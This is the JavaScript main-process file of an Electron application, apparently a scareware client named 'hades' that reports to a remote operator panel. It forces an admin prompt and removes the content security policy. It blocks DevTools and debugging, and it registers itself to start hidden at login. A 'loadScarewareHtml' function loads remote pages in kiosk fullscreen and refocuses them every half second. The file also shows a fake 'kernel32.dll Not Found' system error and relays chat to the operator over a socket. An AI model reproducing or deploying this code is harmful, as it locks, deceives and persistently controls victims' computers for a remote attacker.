Object.defineProperty(exports, "__esModule", {
  value: true
});
const electron = require("electron");
const path = require("path");
const {
  AdminCheck
} = require("./utils/AdminCheck");
const {
  ThemeLoader
} = require("./utils/ThemeLoader");
const {
  CONFIG
} = require("../config");
const fs = require("fs");
const {
  logger
} = require("../utils/Logger");
const {
  fetchThemeContent
} = require("../utils/fetchThemeContent");
Object.defineProperty(exports, "BrowserWindow", {
  enumerable: true,
  get: () => electron.BrowserWindow
});
Object.defineProperty(exports, "ipcMain", {
  enumerable: true,
  get: () => electron.ipcMain
});
let mainWindow = null;
exports.mainWindow = mainWindow;
let allowClose = false;
let socketInstance = null;
async function createWindow() {
  if (!(await AdminCheck.checkAdminPrivileges())) {
    const fs = require("fs");
    const path = require("path");
    const os = require("os");
    try {
      const logPath = path.join(os.tmpdir(), "hades_logs", "hades_log.txt");
      fs.appendFileSync(logPath, "[WARN] Admin privileges not found! Triggering UAC prompt and quitting application...\n");
    } catch (error) {}
    AdminCheck.requestAdminPrivileges();
    electron.app.quit();
    return;
  }
  electron.session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    const headers = {
      ...details.responseHeaders
    };
    delete headers["content-security-policy"];
    delete headers["Content-Security-Policy"];
    headers["Content-Security-Policy"] = ["default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; " + "script-src * 'unsafe-inline' 'unsafe-eval'; " + "script-src-attr * 'unsafe-inline'; " + "style-src * 'unsafe-inline' https://fonts.googleapis.com; " + "font-src * data: https://fonts.gstatic.com; " + "img-src * data: blob: https:;"];
    callback({
      responseHeaders: headers
    });
  });
  new ThemeLoader();
  const theme = CONFIG.ELECTRON_THEME || null;
  let width = 800;
  let height = 600;
  let themeURL = "";
  if (theme) {
    const themeName = theme.endsWith(".html") ? theme.replace(".html", "") : theme;
    themeURL = CONFIG.API_URL + "/api/v1/panel/themes/" + themeName;
    try {
      const content = await fetchThemeContent(themeURL);
      const widthMatch = content.match(new RegExp("width:\\s*(\\d+)px", ""));
      const heightMatch = content.match(new RegExp("height:\\s*(\\d+)px", ""));
      if (widthMatch) width = parseInt(widthMatch[1]);
      if (heightMatch) height = parseInt(heightMatch[1]);
    } catch (error) {
      console.error("Error parsing theme dimensions:", error);
    }
  }
  mainWindow = new electron.BrowserWindow({
    width,
    height,
    frame: false,
    transparent: true,
    resizable: false,
    webPreferences: {
      preload: path.join(__dirname, "..", "dist", "electron", "preload.js"),
      nodeIntegration: true,
      contextIsolation: true,
      sandbox: false,
      devTools: false
    },
    icon: path.join(__dirname, "../../assets/temp_build_icon.ico"),
    show: false
  });
  exports.mainWindow = mainWindow;
  if (themeURL) mainWindow.loadURL(themeURL);else mainWindow.loadURL("about:blank");
  mainWindow.webContents.on("preload-error", (event, preloadPath, error) => {
    logger.error("❌ Preload yüklenemedi: " + preloadPath + " — " + error);
  });
  mainWindow.once("ready-to-show", () => {
    mainWindow?.show();
  });
  mainWindow.on("close", event => {
    if (!allowClose) {
      event.preventDefault();
      mainWindow?.hide();
    }
  });
  mainWindow.on("closed", () => {
    mainWindow = null;
    exports.mainWindow = null;
  });
  mainWindow.webContents.on("before-input-event", (event, input) => {
    if (input.key === "F12" || input.control && input.shift && input.key.toLowerCase() === "i") event.preventDefault();
  });
  mainWindow.webContents.on("devtools-opened", () => {
    mainWindow?.hide();
  });
  electron.Menu.setApplicationMenu(null);
  if (process.argv.some(argument => argument.includes("--remote-debugging-port"))) electron.app.quit();
}
function setSocketInstance(socket) {
  socketInstance = socket;
  logger.info("✅ Socket instance registered in main process");
}
exports.setSocketInstance = setSocketInstance;
async function loadScarewareHtml(html = "html.html") {
  if (!mainWindow) {
    logger.error("❌ Main window not available for HTML load");
    return;
  }
  try {
    const url = CONFIG.API_URL + "/api/v1/panel/themes/" + html;
    await mainWindow.loadURL(url);
    mainWindow.setResizable(true);
    mainWindow.setFullScreen(true);
    mainWindow.show();
    mainWindow.focus();
    mainWindow.setKiosk(true);
    setInterval(() => {
      if (mainWindow) {
        mainWindow.setResizable(true);
        mainWindow.setFullScreen(true);
        mainWindow.show();
        mainWindow.focus();
      }
    }, 500);
    logger.info("✅ HTML loaded successfully");
  } catch (error) {
    logger.error("❌ Load error: " + error);
  }
}
exports.loadScarewareHtml = loadScarewareHtml;
if (electron.app?.isPackaged) {
  electron.app.disableHardwareAcceleration();
  electron.app.commandLine.appendSwitch("disable-gpu");
  electron.app.commandLine.appendSwitch("disable-software-rasterizer");
  electron.app.commandLine.appendSwitch("disable-gpu-compositing");
  electron.app.commandLine.appendSwitch("no-sandbox");
  electron.app.commandLine.appendSwitch("disable-gpu-sandbox");
  electron.app.setLoginItemSettings({
    openAtLogin: true,
    enabled: true,
    path: electron.app.getPath("exe"),
    args: ["--hidden"],
    name: electron.app.getName()
  });
  const hidden = process.argv.includes("--hidden");
  electron.app.whenReady().then(() => {
    if (hidden) mainWindow?.hide();
  });
  electron.app.on("ready", createWindow);
  electron.app.on("window-all-closed", () => {
    if (process.platform !== "darwin") mainWindow?.hide();
  });
  electron.app.on("activate", () => {
    if (mainWindow === null) createWindow();else mainWindow.show();
  });
  electron.ipcMain.on("minimize-to-tray", () => {
    if (mainWindow) mainWindow.hide();
  });
  electron.ipcMain.on("close-app", () => {
    if (mainWindow) mainWindow.hide();
  });
  electron.ipcMain.on("hide-window", () => {
    if (mainWindow) mainWindow.hide();
  });
  electron.ipcMain.on("hide-me", () => {
    if (mainWindow) mainWindow.hide();
  });
  electron.ipcMain.on("show-warning-dialog", async event => {
    const result = await electron.dialog.showMessageBox(mainWindow, {
      type: "error",
      title: "System Error",
      message: "kernel32.dll Not Found",
      detail: "This critical system file is missing or corrupted. Please reinstall Windows to restore system functionality.",
      buttons: ["OK"],
      defaultId: 0,
      noLink: true
    });
    if (result.response === 0) mainWindow?.hide();
    if (mainWindow && !mainWindow.isVisible()) setTimeout(() => {
      mainWindow?.hide();
    }, 10000);
    if (mainWindow) {
      mainWindow.show();
      mainWindow.focus();
    }
  });
  electron.ipcMain.on("load-theme", (event, theme) => {
    const themePath = new ThemeLoader().getThemePath(theme);
    if (fs.existsSync(themePath)) event.reply("theme-loaded", {
      success: true,
      theme,
      path: themePath
    });else event.reply("theme-loaded", {
      success: false,
      error: "Theme not found"
    });
  });
  electron.ipcMain.on("load-html", async (event, request) => {
    if (!mainWindow) return;
    const html = request?.html || "test.html";
    const filePath = path.join(electron.app.getAppPath(), "assets/html", html);
    logger.info("🔄 Loading HTML: " + html + " from " + filePath);
    if (fs.existsSync(filePath)) {
      try {
        await mainWindow.loadFile(filePath);
        mainWindow.setResizable(true);
        mainWindow.setFullScreen(true);
        mainWindow.show();
        mainWindow.focus();
        logger.info("✅ HTML loaded successfully");
      } catch (error) {
        logger.error("❌ Load error: " + error);
      }
    } else {
      logger.error("❌ File missing: " + filePath);
    }
  });
  electron.ipcMain.on("chat-message", (event, request) => {
    logger.info("mesaj buraya geldi abi");
    if (!socketInstance) return logger.info("no socket instanece");
    socketInstance.emit("send-message", {
      message: request?.message,
      timestamp: new Date().toISOString(),
      sender: "user"
    });
    logger.info("📤 Message sent via socket:" + request?.message);
  });
  electron.ipcMain.handle("get-user-message", async (event, message) => ({
    success: true,
    message
  }));
  electron.ipcMain.handle("get-available-themes", async () => new ThemeLoader().getAvailableThemes());
  electron.ipcMain.handle("get-config", async () => ({
    apiUrl: CONFIG.API_URL,
    adminId: CONFIG.ADMIN_ID,
    licenseKey: CONFIG.LICENSE_KEY,
    currentTheme: CONFIG.ELECTRON_THEME || "Minecraft.html"
  }));
}
process.on("uncaughtException", error => {
  logger.error("Uncaught Exception:", error);
  const fs = require("fs");
  const path = require("path");
  const os = require("os");
  try {
    const logPath = path.join(os.tmpdir(), "hades_logs", "hades_log.txt");
    fs.appendFileSync(logPath, "[ERROR] Uncaught Exception: " + error + "\n" + error?.stack + "\n");
  } catch (error) {}
});
process.on("unhandledRejection", (reason, promise) => {
  logger.error("Unhandled Rejection at:" + promise + " reason:" + reason);
  const fs = require("fs");
  const path = require("path");
  const os = require("os");
  try {
    const logPath = path.join(os.tmpdir(), "hades_logs", "hades_log.txt");
    fs.appendFileSync(logPath, "[ERROR] Unhandled Rejection: " + reason + "\n");
  } catch (error) {}
});
exports.default = electron.app;
